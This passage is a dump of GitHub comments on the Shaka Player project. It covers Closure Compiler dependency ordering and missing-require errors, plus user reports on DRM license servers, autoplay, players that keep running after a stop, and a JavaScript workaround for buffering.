\\\ntest/media/mp4_segment_index_parser_unit.js \\\nlib/media/segment_index.js \\\nexterns/shaka/offline.js \\\nlib/media/mp4_segment_index_parser.js \\\nlib/media/presentation_timeline.js \\\nexterns/shaka/abr_manager.js \\\nlib/media/text_engine.js \\\nlib/media/playhead.js \\\nlib/util/multi_map.js \\\nlib/media/ttml_text_parser.js \\\ntest/util/data_view_reader_unit.js \\\nlib/offline/db_engine.js \\\nlib/util/data_view_reader.js \\\ntest/util/event_manager_unit.js \\\nlib/util/config_utils.js \\\nlib/util/functional.js \\\ntest/media/mp4_ttml_parser_unit.js \\\nexterns/shaka/namespace.js \\\ntest/media/playhead_unit.js \\\ntest/media/segment_index_unit.js \\\nexterns/chromecast.js \\\nexterns/shaka/manifest_parser.js \\\ntest/player_integration.js \\\ntest/cast/cast_sender_unit.js \\\ntest/test/util/memory_db_engine.js \\\ntest/test/util/stream_generator.js \\\nlib/net/networking_engine.js \\\ntest/test/externs/sprintf.js \\\nlib/offline/storage.js \\\nexterns/shaka/player.js \\\ntest/test/externs/require.js \\\nlib/dash/dash_parser.js \\\nthird_party/closure/goog/uri/uri.js \\\nlib/util/text_parser.js \\\nlib/polyfill/videoplaybackquality.js \\\nlib/media/webm_segment_index_parser.js \\\nlib/media/streaming_engine.js \\\ntest/dash/dash_parser_manifest_unit.js \\\nlib/dash/segment_base.js \\\nlib/polyfill/all.js \\\ntest/media/vtt_text_parser_unit.js \\\nlib/abr/ewma_bandwidth_estimator.js \\\ntest/util/text_parser_unit.js \\\nlib/player.js \\\nexterns/jwk_set.js \\\ntest/util/pssh_unit.js \\\ndemo/controls.js \\\nlib/util/i_destroyable.js \\\ntest/cast/cast_utils_unit.js \\\ntest/util/cancelable_chain_unit.js \\\ntest/cast/cast_proxy_unit.js \\\nexterns/shaka/manifest.js \\\nlib/cast/cast_proxy.js \\\ntest/media/drm_engine_integration.js \\\ndemo/offline_section.js \\\ntest/test/util/test_scheme.js;\n. That is awesome that a fix is so simple. However, isn't this a sign of a larger problem? As build/all.py is not passing any --dependency_mode it means that NONE is used. Therefore, the order of files passed to the compiler is relevant. By doing an alphabetical sort are we not just \"getting lucky\" that the ordering is correct? In other words, I think that if some of the files were simply renamed the build could fail again. I think a better fix would be to use a dependency aware sort.\nWhat are your thoughts?\n. Good idea about shaka-player.uncompiled.js. If we use --dependency_mode=LOOSE any file without a goog.provide or goog.module will be retained. So as long as we pass shaka-player.uncompiled.js all of the goog.require() in it will be retained as well.\n. As the testing code does not use goog.provide/goog.require the compiler is having problems sorting those files correctly. Can we merge this PR with the files.sort() fix to land the new compiler?\nI'm looking into a more complete fix for the dependency_mode. Either way, I think the command lines we build shouldn't depend on ordering returned by os.walk() so sorting the files in python is a good idea even after we use dependency_mode.\n. I moved the discussion of --dependency_mode to #465. I think this change can be reviewed/merged \nas-is.\nPTAL\n. > The tests are not compiled. We run the compiler over them with --checks-only to catch mistakes early.\nTrue. But even --checks-only code needs the types to be declared in the correct order.  Therefore, source file ordering matters for --checks-only compiler invocations. See an example in #465.\n. Thanks for all your help! I really appreciate it.\n. It looks like this change depends on the updated compiler. Sorry for the confusion. I didn't realize  how recently https://github.com/google/closure-compiler/commit/91014522 was merged.\nWould you like me to squash this into #421 or do you just want to merge them at the same time?\n. Thanks. Updated per your comment.\n. I actually updated again to @return {!Object.<string, !shakaExtern.Stream>} as that type is slightly tighter. Please let me know if you disagree.\n. Updated the comments per your feedback.\nPTAL\n. > it is already non-nullable by default\nThanks for the explanation. I didn't realize that.\n. Moving discussion of --dependency_mode to this PR.\nI agree that everything in lib/ looks good (i.e. all files have a goog.provide).\nHowever, I'm struggling to see why the testing code does not need a dependency based ordering. It seems we have at least three options for the testing code:\n1. dep_mode = NONE, order files based upon os.walk()\n2. dep_mode = NONE, order files alphabetically\n3. dep_mode = LOOSE\nOption 1 is not good since the ordering varies based upon the file system directory entries. Option 2 is not good since it requires the files to be named in a specific way to ensure the type checking of the test files work. Option 3 does not work since the compiler does not know how to order files which do not contain a goog.provide/goog.require dependency graph.\nCan you clarify?\nIn case it is helpful, the code in this PR fails with:\n```\nChecking the tests for type errors...\n/home/ahochhaus/shaka-player/test/offline/storage_unit.js:33: ERROR - variable createMockVideo is undeclared\n    player = new shaka.Player(createMockVideo(), function(player) {\n                              ^\n1 error(s), 0 warning(s)\nBuild failed\n``\n. As I'm digging deeper into the code intest/I'm finding that some of it usesgoog.provideandgoog.require`. Is this intentional?\nahochhaus@debian:~/shaka-player2$ g -r goog.provide test/\ntest/test/util/stream_generator.js:goog.provide('shaka.test.DashLiveStreamGenerator');\ntest/test/util/stream_generator.js:goog.provide('shaka.test.DashVodStreamGenerator');\ntest/test/util/stream_generator.js:goog.provide('shaka.test.IStreamGenerator');\ntest/test/util/stream_generator.js:goog.provide('shaka.test.StreamGenerator');\ntest/test/util/streaming_engine_util.js:goog.provide('shaka.test.StreamingEngineUtil');\ntest/test/util/fake_networking_engine.js:goog.provide('shaka.test.FakeNetworkingEngine');\ntest/test/util/test_scheme.js:goog.provide('shaka.test.TestScheme');\ntest/test/util/fake_media_source_engine.js:goog.provide('shaka.test.FakeMediaSourceEngine');\ntest/test/util/manifest_generator.js:goog.provide('shaka.test.ManifestGenerator');\ntest/test/util/simple_fakes.js:goog.provide('shaka.test.FakeAbrManager');\ntest/test/util/simple_fakes.js:goog.provide('shaka.test.FakeDrmEngine');\ntest/test/util/simple_fakes.js:goog.provide('shaka.test.FakeManifestParser');\ntest/test/util/simple_fakes.js:goog.provide('shaka.test.FakeStreamingEngine');\ntest/test/util/util.js:goog.provide('shaka.test.Util');\ntest/test/util/dash_parser_util.js:goog.provide('shaka.test.Dash');\ntest/test/util/memory_db_engine.js:goog.provide('shaka.test.MemoryDBEngine');\nahochhaus@debian:~/shaka-player2$ g -r goog.require test/\ntest/media/mp4_ttml_parser_unit.js:goog.require('shaka.test.Util');\ntest/media/mp4_segment_index_parser_unit.js:goog.require('shaka.test.Util');\ntest/media/mp4_vtt_parser_unit.js:goog.require('shaka.test.Util');\ntest/test/util/streaming_engine_util.js:goog.require('shaka.media.SegmentReference');\ntest/test/util/streaming_engine_util.js:goog.require('shaka.test.FakeNetworkingEngine');\ntest/test/util/fake_networking_engine.js:goog.require('shaka.util.StringUtils');\nahochhaus@debian:~/shaka-player2$\nI think this partial dependency graph may be causing issues for the compiler (in terms of which files can be dropped) when using --dependency_mode=LOOSE.\nSaid differently, I think the best options are one of the following:\n1. Remove all goog.provide and goog.require calls from the testing code. Add a --jscomp_off=missingProvide to build/checks.py (in addition to the --jscomp_off=missingRequire which is already set for the testing code). Run the --check_only compile with --dependency_mode=NONE. Find a way to correctly order the files in python (neither os.walk() nor alphabetical is really correct here though -- even if they do happen to work most of the time).\n2. Populate the testing code with goog.provide and goog.require as per more standard closure-style javascript code. Remove --jscomp_off=missingRequire from build/checks.py. Run the --check_only compile with --dependency_mode=LOOSE.\n3. Just use the alphabetical ordering as it works for the time being. Deal with this issue later if it comes up. Run the  --check_only compile with --dependency_mode=NONE and the full compile in --dependency_mode=LOOSE.\nDo these seem reasonable to you? Can you think of any options that I'm missing? Which solution would you prefer that I implement?\nOption 3 is trivial to implement. Option 2 is the most verbose but also the most correct IMO. Option 1 seems like the worst option as doing complex file ordering outside of the closure ecosystem is not very idiomatic.\n. It looks like fixing the tests to be written in idomatic closure is a larger change than I had hopped (option 2 from my previous comment). I guess my recommendation is to use option 3 (--dependency_mode=LOOSE for the library compile and --dependency_mode=NONE for --check_only) for now. I have updated this change accordingly.\nLonger term I do think it would be better if the testing code was ordered with --dependency_mode=LOOSE as well.\nPTAL\n. @joeyparrish Can you take a look at this change?\n. Thanks @TheModMaker. I appreciate the point. That said, at least the Access-Control-Allow-Headers: Range does depend specifically on the headers sent by shaka. I'm fine with leaving out the documentation for the other headers (as you say, they are not dependent on shaka). However, without diving into the shaka source, how can one be sure of which non-simple headers shaka adds to the requests?\nTo me, anything that requires reading the source for correct server configuration should be documented. What do you think?. Regrettably, the compiler contains two different variants of the \"missing require\" check (MISSING_REQUIRE_WARNING, MISSING_REQUIRE_CALL_WARNING). Some legacy code is preventing MISSING_REQUIRE_CALL_WARNING from being included with the \"missingRequire\" diagnostic group but rather it is included in \"lintChecks\".\nSaid differently, all of the lintChecks besides MISSING_REQUIRE_CALL_WARNING still pass. Without adding lintChecks we get the following errors:\n```\n/home/ahochhaus/shaka-player2/demo/asset_section.js:30: ERROR - missing require: 'shakaAssets.testAssets'\n  shakaAssets.testAssets.forEach(function(asset) {\n  ^\n/home/ahochhaus/shaka-player2/demo/asset_section.js:194: ERROR - missing require: 'shaka.log'\n      shaka.log.debug('load() interrupted');\n      ^\n/home/ahochhaus/shaka-player2/demo/configuration_section.js:59: ERROR - missing require: 'shakaDemo.player_'\n  shakaDemo.player_.configure(/* @type {shakaExtern.PlayerConfiguration} /({\n  ^\n/home/ahochhaus/shaka-player2/demo/configuration_section.js:71: ERROR - missing require: 'shakaDemo.controls_'\n  shakaDemo.controls_.showTrickPlay(event.target.checked);\n  ^\n/home/ahochhaus/shaka-player2/demo/info_section.js:28: ERROR - missing require: 'shakaDemo.player_'\n  shakaDemo.player_.addEventListener(\n  ^\n/home/ahochhaus/shaka-player2/demo/info_section.js:107: ERROR - missing require: 'shakaDemo.player_'\n  var tracks = shakaDemo.player_.getTracks();\n               ^\n/home/ahochhaus/shaka-player2/demo/log_section.js:91: ERROR - missing require: 'shaka.log'\n  shaka.log.setLevel(shaka.log.currentLevel);\n  ^\n/home/ahochhaus/shaka-player2/demo/main.js:79: ERROR - missing require: 'shaka.log'\n    shaka.log.setLevel(shaka.log.Level.DEBUG);\n    ^\n/home/ahochhaus/shaka-player2/demo/main.js:84: ERROR - missing require: 'shaka.polyfill'\n  shaka.polyfill.installAll();\n  ^\n/home/ahochhaus/shaka-player2/demo/main.js:86: ERROR - missing require: 'shaka.Player'\n  if (!shaka.Player.isBrowserSupported()) {\n       ^\n/home/ahochhaus/shaka-player2/demo/main.js:112: ERROR - missing require: 'shaka.Player'\n    shaka.Player.probeSupport().then(function(support) {\n    ^\n/home/ahochhaus/shaka-player2/test/cancelable_chain_unit.js:185: ERROR - missing require: 'shaka.test.Util'\n      shaka.test.Util.delay(0.1).then(function() {\n      ^\n/home/ahochhaus/shaka-player2/test/dash_parser_content_protection_unit.js:33: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    var retry = shaka.net.NetworkingEngine.defaultRetryParameters();\n                ^\n/home/ahochhaus/shaka-player2/test/dash_parser_content_protection_unit.js:125: ERROR - missing require: 'shaka.util.Uint8ArrayUtils'\n        initData: shaka.util.Uint8ArrayUtils.fromBase64(base64)\n                  ^\n/home/ahochhaus/shaka-player2/test/dash_parser_content_protection_unit.js:219: ERROR - missing require: 'shaka.test.Dash'\n    var expected = shaka.test.Dash.makeManifestFromStreamSets([\n                   ^\n/home/ahochhaus/shaka-player2/test/dash_parser_live_unit.js:30: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    var retry = shaka.net.NetworkingEngine.defaultRetryParameters();\n                ^\n/home/ahochhaus/shaka-player2/test/dash_parser_live_unit.js:430: ERROR - missing require: 'shaka.util.StringUtils'\n            var data = shaka.util.StringUtils.toUTF8(manifest);\n                       ^\n/home/ahochhaus/shaka-player2/test/dash_parser_live_unit.js:853: ERROR - missing require: 'shaka.test.Dash'\n      shaka.test.Dash.makeReference('s4.mp4', 4, 30, 40)\n      ^\n/home/ahochhaus/shaka-player2/test/dash_parser_manifest_unit.js:27: ERROR - missing require: 'shaka.test.Dash'\n    parser = shaka.test.Dash.makeDashParser();\n             ^\n/home/ahochhaus/shaka-player2/test/dash_parser_manifest_unit.js:555: ERROR - missing require: 'shaka.util.StringUtils'\n          var data = shaka.util.StringUtils.toUTF8(source);\n                     ^\n/home/ahochhaus/shaka-player2/test/dash_parser_segment_base_unit.js:30: ERROR - missing require: 'shaka.test.Dash'\n    parser = shaka.test.Dash.makeDashParser();\n             ^\n/home/ahochhaus/shaka-player2/test/dash_parser_segment_list_unit.js:30: ERROR - missing require: 'shaka.test.Dash'\n    parser = shaka.test.Dash.makeDashParser();\n             ^\n/home/ahochhaus/shaka-player2/test/dash_parser_segment_list_unit.js:33: ERROR - missing require: 'shaka.test.Dash'\n  shaka.test.Dash.makeTimelineTests('SegmentList', '', [\n  ^\n/home/ahochhaus/shaka-player2/test/dash_parser_segment_template_unit.js:30: ERROR - missing require: 'shaka.test.Dash'\n    parser = shaka.test.Dash.makeDashParser();\n             ^\n/home/ahochhaus/shaka-player2/test/dash_parser_segment_template_unit.js:33: ERROR - missing require: 'shaka.test.Dash'\n  shaka.test.Dash.makeTimelineTests(\n  ^\n/home/ahochhaus/shaka-player2/test/data_uri_plugin_unit.js:22: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    retryParameters = shaka.net.NetworkingEngine.defaultRetryParameters();\n                      ^\n/home/ahochhaus/shaka-player2/test/data_uri_plugin_unit.js:78: ERROR - missing require: 'shaka.util.StringUtils'\n          var data = shaka.util.StringUtils.fromBytesAutoDetect(response.data);\n                     ^\n/home/ahochhaus/shaka-player2/test/data_uri_plugin_unit.js:87: ERROR - missing require: 'shaka.net.NetworkingEngine'\n        shaka.net.NetworkingEngine.makeRequest([uri], retryParameters);\n        ^\n/home/ahochhaus/shaka-player2/test/data_uri_plugin_unit.js:88: ERROR - missing require: 'shaka.net.DataUriPlugin'\n    shaka.net.DataUriPlugin(uri, request)\n    ^\n/home/ahochhaus/shaka-player2/test/db_engine_unit.js:31: ERROR - missing require: 'shaka.offline.DBEngine'\n    shaka.offline.DBEngine.deleteDatabase().then(function() {\n    ^\n/home/ahochhaus/shaka-player2/test/db_engine_unit.js:117: ERROR - missing require: 'shaka.test.Util'\n      shaka.test.Util.expectToEqualError(error, expectedError);\n      ^\n/home/ahochhaus/shaka-player2/test/db_engine_unit.js:126: ERROR - missing require: 'shaka.test.Util'\n          return shaka.test.Util.delay(0.001);\n                 ^\n/home/ahochhaus/shaka-player2/test/drm_engine_integration.js:47: ERROR - missing require: 'shaka.media.DrmEngine'\n    var supportTest = shaka.media.DrmEngine.probeSupport()\n                      ^\n/home/ahochhaus/shaka-player2/test/drm_engine_integration.js:73: ERROR - missing require: 'shaka.net.HttpPlugin'\n      shaka.net.HttpPlugin(audioSegmentUri, dummyRequest)\n      ^\n/home/ahochhaus/shaka-player2/test/drm_engine_integration.js:282: ERROR - missing require: 'shaka.net.NetworkingEngine'\n        retryParameters: shaka.net.NetworkingEngine.defaultRetryParameters(),\n                         ^\n/home/ahochhaus/shaka-player2/test/drm_engine_integration.js:350: ERROR - missing require: 'shaka.test.Util'\n        shaka.test.Util.expectToEqualError(\n        ^\n/home/ahochhaus/shaka-player2/test/drm_engine_integration.js:386: ERROR - missing require: 'shaka.test.Util'\n        return Promise.race([shaka.test.Util.delay(6), onErrorCalled]);\n                             ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:99: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    var retryParameters = shaka.net.NetworkingEngine.defaultRetryParameters();\n                          ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:563: ERROR - missing require: 'shaka.util.StringUtils'\n        var initData = JSON.parse(shaka.util.StringUtils.fromUTF8(\n                                  ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:898: ERROR - missing require: 'shaka.net.DataUriPlugin'\n        return shaka.net.DataUriPlugin(request.uris[0], request);\n               ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:910: ERROR - missing require: 'shaka.util.StringUtils'\n            shaka.util.StringUtils.fromBytesAutoDetect(licenseBuffer);\n            ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:942: ERROR - missing require: 'shaka.test.Util'\n        shaka.test.Util.expectToEqualError(error, new shaka.util.Error(\n        ^\n/home/ahochhaus/shaka-player2/test/drm_engine_unit.js:1271: ERROR - missing require: 'shaka.test.Util'\n        return shaka.test.Util.delay(0.1);\n               ^\n/home/ahochhaus/shaka-player2/test/ebml_parser_unit.js:238: ERROR - missing require: 'shaka.util.EbmlParser'\n      shaka.util.EbmlParser.getVintValue_(data);\n      ^\n/home/ahochhaus/shaka-player2/test/fake_event_target_unit.js:132: ERROR - missing require: 'shaka.test.Util'\n    shaka.test.Util.delay(0.1).then(function() {\n    ^\n/home/ahochhaus/shaka-player2/test/http_plugin_unit.js:48: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    retryParameters = shaka.net.NetworkingEngine.defaultRetryParameters();\n                      ^\n/home/ahochhaus/shaka-player2/test/http_plugin_unit.js:128: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    var request = shaka.net.NetworkingEngine.makeRequest(\n                  ^\n/home/ahochhaus/shaka-player2/test/http_plugin_unit.js:130: ERROR - missing require: 'shaka.net.HttpPlugin'\n    shaka.net.HttpPlugin(uri, request)\n    ^\n/home/ahochhaus/shaka-player2/test/networking_engine_unit.js:49: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    shaka.net.NetworkingEngine.registerScheme('reject', rejectScheme);\n    ^\n/home/ahochhaus/shaka-player2/test/networking_engine_unit.js:239: ERROR - missing require: 'shaka.net.NetworkingEngine'\n      shaka.net.NetworkingEngine.unregisterScheme('resolve');\n      ^\n/home/ahochhaus/shaka-player2/test/networking_engine_unit.js:630: ERROR - missing require: 'shaka.net.NetworkingEngine'\n                          shaka.net.NetworkingEngine.defaultRetryParameters();\n                          ^\n/home/ahochhaus/shaka-player2/test/networking_engine_unit.js:631: ERROR - missing require: 'shaka.net.NetworkingEngine'\n    return shaka.net.NetworkingEngine.makeRequest([uri], retryParameters);\n           ^\n/home/ahochhaus/shaka-player2/test/offline_integration.js:33: ERROR - missing require: 'shaka.Player'\n    var supportPromise = shaka.Player.probeSupport()\n                         ^\n/home/ahochhaus/shaka-player2/test/offline_integration.js:41: ERROR - missing require: 'shaka.offline.DBEngine'\n    Promise.all([shaka.offline.DBEngine.deleteDatabase(), supportPromise])\n                 ^\n/home/ahochhaus/shaka-player2/test/offline_integration.js:115: ERROR - missing require: 'shaka.test.Util'\n      shaka.test.Util.expectToEqualError(e, expected);\n      ^\n/home/ahochhaus/shaka-player2/test/offline_integration.js:129: ERROR - missing require: 'shaka.test.Util'\n          return shaka.test.Util.delay(5);\n                 ^\n/home/ahochhaus/shaka-player2/test/player_unit.js:120: ERROR - missing require: 'shaka.log'\n        shaka.log.debug('finished unload 2');\n        ^\n/home/ahochhaus/shaka-player2/test/player_unit.js:253: ERROR - missing require: 'shaka.media.ManifestParser'\n        shaka.media.ManifestParser.registerParserByMime('undefined', factory1);\n        ^\n/home/ahochhaus/shaka-player2/test/player_unit.js:335: ERROR - missing require: 'shaka.test.Util'\n        shaka.test.Util.delay(0.5).then(function() {\n        ^\n/home/ahochhaus/shaka-player2/test/player_unit.js:1223: ERROR - missing require: 'shaka.test.Util'\n        shaka.test.Util.expectToEqualError(\n        ^\n/home/ahochhaus/shaka-player2/test/simple_abr_manager_unit.js:278: ERROR - missing require: 'shaka.test.Util'\n    var delay = shaka.test.Util.fakeEventLoop(\n                ^\n/home/ahochhaus/shaka-player2/test/storage_unit.js:636: ERROR - missing require: 'shaka.test.Util'\n            shaka.test.Util.expectToEqualError(\n            ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:147: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n      timeline = shaka.test.StreamingEngineUtil.createFakePresentationTimeline(\n                 ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:205: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n        shaka.test.StreamingEngineUtil.boundsCheckPosition.bind(\n        ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:209: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n        shaka.test.StreamingEngineUtil.getNumSegments.bind(\n        ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:214: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n    netEngine = shaka.test.StreamingEngineUtil.createFakeNetworkingEngine(\n                ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:257: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n    manifest = shaka.test.StreamingEngineUtil.createManifest(\n               ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_integration.js:293: ERROR - missing require: 'shaka.net.NetworkingEngine'\n      retryParameters: shaka.net.NetworkingEngine.defaultRetryParameters(),\n                       ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_unit.js:232: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n    timeline = shaka.test.StreamingEngineUtil.createFakePresentationTimeline(\n               ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_unit.js:248: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n    netEngine = shaka.test.StreamingEngineUtil.createFakeNetworkingEngine(\n                ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_unit.js:266: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n    manifest = shaka.test.StreamingEngineUtil.createManifest(\n               ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_unit.js:304: ERROR - missing require: 'shaka.test.StreamingEngineUtil'\n        shaka.test.StreamingEngineUtil.createMockVideoStream(6);\n        ^\n/home/ahochhaus/shaka-player2/test/streaming_engine_unit.js:1730: ERROR - missing require: 'shaka.net.NetworkingEngine'\n        retryParameters: shaka.net.NetworkingEngine.defaultRetryParameters(),\n                         ^\n/home/ahochhaus/shaka-player2/test/support_check.js:20: ERROR - missing require: 'shaka.Player'\n    if (!shaka.Player.isBrowserSupported()) {\n         ^\n/home/ahochhaus/shaka-player2/test/support_check.js:22: ERROR - missing require: 'shaka.test.Util'\n      shaka.test.Util.cancelAllRemainingSpecs();\n      ^\n/home/ahochhaus/shaka-player2/test/util/dash_parser_util.js:26: ERROR - missing require: 'shaka.net.NetworkingEngine'\n  var retry = shaka.net.NetworkingEngine.defaultRetryParameters();\n              ^\n/home/ahochhaus/shaka-player2/test/util/dash_parser_util.js:102: ERROR - missing require: 'shaka.util.StringUtils'\n  var manifestData = shaka.util.StringUtils.toUTF8(manifestText);\n                     ^\n/home/ahochhaus/shaka-player2/test/util/dash_parser_util.js:110: ERROR - missing require: 'shaka.test.Util'\n        shaka.test.Util.expectToEqualError(error, expectedError);\n        ^\n/home/ahochhaus/shaka-player2/test/util/manifest_generator.js:262: ERROR - missing require: 'shaka.util.Uint8ArrayUtils'\n  var buffer = shaka.util.Uint8ArrayUtils.fromBase64(base64);\n               ^\n/home/ahochhaus/shaka-player2/test/util/manifest_generator.js:541: ERROR - missing require: 'goog.asserts'\n  goog.asserts.assert(streamSet.streams.length > 0,\n  ^\n/home/ahochhaus/shaka-player2/test/util/memory_db_engine.js:85: ERROR - missing require: 'shaka.util.MapUtils'\n  shaka.util.MapUtils.values(this.getStore_(storeName)).forEach(callback);\n  ^\n/home/ahochhaus/shaka-player2/test/util/memory_db_engine.js:135: ERROR - missing require: 'goog.asserts'\n  goog.asserts.assert(storeName in this.stores_,\n  ^\n/home/ahochhaus/shaka-player2/test/util/stream_generator.js:482: ERROR - missing require: 'goog.asserts'\n  goog.asserts.assert(\n  ^\n/home/ahochhaus/shaka-player2/test/util/stream_generator.js:500: ERROR - missing require: 'shaka.log'\n    shaka.log.debug('tfdt box is version 1.');\n    ^\n/home/ahochhaus/shaka-player2/test/util/util.js:277: ERROR - missing require: 'shaka.log'\n    shaka.log.setLevel(shaka.log.Level.INFO);\n    ^\n/home/ahochhaus/shaka-player2/test/util/util.js:279: ERROR - missing require: 'shaka.polyfill'\n  shaka.polyfill.installAll();\n  ^\n/home/ahochhaus/shaka-player2/test/vtt_text_parser_unit.js:280: ERROR - missing require: 'shaka.util.StringUtils'\n    var data = shaka.util.StringUtils.toUTF8(string);\n               ^\n/home/ahochhaus/shaka-player2/test/vtt_text_parser_unit.js:282: ERROR - missing require: 'shaka.media.VttTextParser'\n      shaka.media.VttTextParser(data);\n      ^\n88 error(s), 0 warning(s)\n```\nDo you know of a better solution?\n. Yes, this is the circular dependency. I added the TODO.\n. I think the compiler does not like the way the namespace is formed. These are the errors:\n```\n/home/ahochhaus/shaka-player2/lib/polyfill/mediakeys.js:55: ERROR - missing require: 'shaka.polyfill.PatchedMediaKeys'\n    shaka.polyfill.PatchedMediaKeys.v01b.install();\n    ^\n/home/ahochhaus/shaka-player2/lib/polyfill/mediakeys.js:58: ERROR - missing require: 'shaka.polyfill.PatchedMediaKeys'\n    shaka.polyfill.PatchedMediaKeys.v20140218.install();\n    ^\n/home/ahochhaus/shaka-player2/lib/polyfill/mediakeys.js:61: ERROR - missing require: 'shaka.polyfill.PatchedMediaKeys'\n    shaka.polyfill.PatchedMediaKeys.nop.install();\n    ^\n3 error(s), 0 warning(s)\n```\nI lowered the \"p\" in \"patchedMediaKeys\" in the next patchset which allows me to omit the suppress while keeping the compiler happy. If you prefer a different work around please let me know.\n. I changed to @return {{audio: string, video: string, text: string}}.\nAs you know the shaka code better than I can you suggest a tighter type?\n. I changed to @return {{audio: string, video: string}}.\nAs you know the shaka code better than I can you suggest a tighter type?\n. ",
    "haithanhnguyen": "Thanks for your reply,\nIn my case, I want to deploy private licence server. So, how can I do?\nP/S: I've tried  http://widevine-proxy.appspot.com/proxy, but I cannot encrypt with shaka packager. Error: \"Widevine encryption key source failed to fetch keys: 7 (HTTP_FAILURE): curl_easy_perform() failed: HTTP response code said error. Response code: 404\" \n. ",
    "tranzitwww": "Hi,\nIt works if you add \"autoplay\" and \"muted\" to the video HTMLMediaElements.\nAlso check that the browser has enabled \"autoplay\" on Android Chrome \n[Settings] - [Site Settings] - [Media] - [Autoplay] and Allow Autoplay.\nhttps://developers.google.com/web/updates/2016/07/autoplay\n. Thank you Jacob for reply and investigation,\n\nWhen do you stop the player (immediately after load or a while after playback)?\n\nAfter a while when it was playing the video.\n\nDoes this problem happen consistently? \n\nYes. All the time.\n\nCould you provide a link to your app or to a full, working snippet that reproduces your problem?\n\nOpen the link bellow in Firefox (in Chrome is the same deal, but is not that quick related to this issue)\nhttp://live.politiadefrontiera.ro/index2.php\nIn the top-right corner are 3 buttons to select a player. Pick the middle one :D\nAfter that pick a policemen, then select a camera and the video should start.\nThen close the info window or select other camera/policemen/player\nNow check the console for new GET requests from shaka player.\nIt gets more intens if you select multiple streams (one by one) which will not completely stop, and in the background will still run the connections to the streaming server for all the streams you opened before.\nIt is bad for bandwidth (from mobile devices perspective) and server useless connections.\n\nCan you try without the if checks in player_stop? I am thinking you may not be actually calling the unload and destroy methods.\n\nWithout that I have to use try and catch, otherwise it will get errors if the player was not yet defined.\nIt does execute the unload and destroy functions. I've inserted a console.log inside that if block for debug.\n. Now the main script is moved to a separated .js file. :)\nI am using stopPlayer on different events, so it will always terminate the player when the infowindow is close, or before opening a new camera. \nThe code is still beta, and there can be some issues (like this one)\nYou are right about that code from Line 414. I've commented that block and now seems to behave as expected :D\nI've been using the part to be sure that no other instance was running before starting the new one, but it wasn't doing what I was expecting.\nThank you very much for the troubleshooting!\nCitizens of the world will be happy to use the player while traveling to Romania. :D\n. ",
    "mnylen": "Hmm... have to check again tomorrow, but I'm testing this when serving from localhost and EwmaBandwidthEstimator has in beta2 started ignoring samples that are either less than 64 KB or took less than 200 ms to download... It could be that... though I tried with network throttling in chrome inspector.\nAnd seems that 60d2944c25d20df125d47affd211df4f2479ba37 which added the 200 ms min time was included only in beta2 and not in beta1, plus it was reverted after beta2 was released. Could explain things. I'll try tomorrow building from sources, as there doesn't seem to be beta3 available...\n. Starts looking like a duplicate of this https://github.com/google/shaka-player/issues/367\n. Yep, closing issue - fixed in master. Same problem as #367 \n. Having spent a few moments going through the codebase, it looks like the delay between buffer running out and buffering event being fired is caused by the delays given to shaka.media.StreamingEngine.prototype.scheduleUpdate_\nDoesn't look like anything is actively trying to stop video or audio from playing if either one runs out of buffered content. But probably browser itself stops the playback when it detects there isn't enough to go on.\nHmm-m... One ugly hack I could implement on my end would be to just have a very short interval running in the background polling the buffering status and pause the video when it detects there isn't anything buffered. Too bad there doesn't seem to be an exposed api on shaka player that would give info about the buffer status. The buffered information given by the video element has proved to not be very trustworthy always... at least not on all platforms, can't remember if it was Android or iOS having problems, or both.\n. https://bugs.chromium.org/p/chromium/issues/detail?id=593271 this might be the Chrome issue.\n. True, it's not perfect... But might be enough to get around the bigger problem of audio not stopping at all on Android. \nCould Shaka's internal state give better estimate when buffer has run out? Doesn't Shaka know which segments it has downloaded and which time ranges those segments map to?\n. Just dropping this here in case someone else stumbles upon this and tries to hack around the problem. Copying this to the demo page's console seems to, at least on desktop, \"solve\" the issue. Have to wait until Monday to check the Android situation when I'm back at office with an actual device to test with.\nOf course, this probably won't work if you seek the video.. Our use case is simpler as we just play video from start to finish without allowing user to seek.\n```\nvar video = document.querySelector(\"video\");\nvar pausedByBuffering = false;\nsetInterval(function() {\n  if (video.buffered.length > 0) {\n    var buffered = video.buffered.end(video.buffered.length - 1) - video.currentTime;\n    var remainingTime = video.duration - video.currentTime;\nif (!video.paused && buffered < 0.5) {\n  console.log(\"video buffer ran out\");\n  pausedByBuffering = true;\n  video.pause();\n} else if (pausedByBuffering && buffered >= Math.min(remainingTime, 5)) {\n  console.log(\"video has buffered enough to continue...\", Math.min(remainingTime, 5));\n  pausedByBuffering = false;\n  video.play();\n}\n\n}\n}, 17); // ~60fps\n```\nEDIT: The above works quite well for Android too. However, one problem is that for some videos, the value of video.buffered.end(video.buffered.length - 1) does not always reach video.duration. In one case we had a video where buffering stopped just 9.999e-7 seconds before getting the full video (a rounding error somewhere?) so it would always pause for buffering at the very end.\n. ",
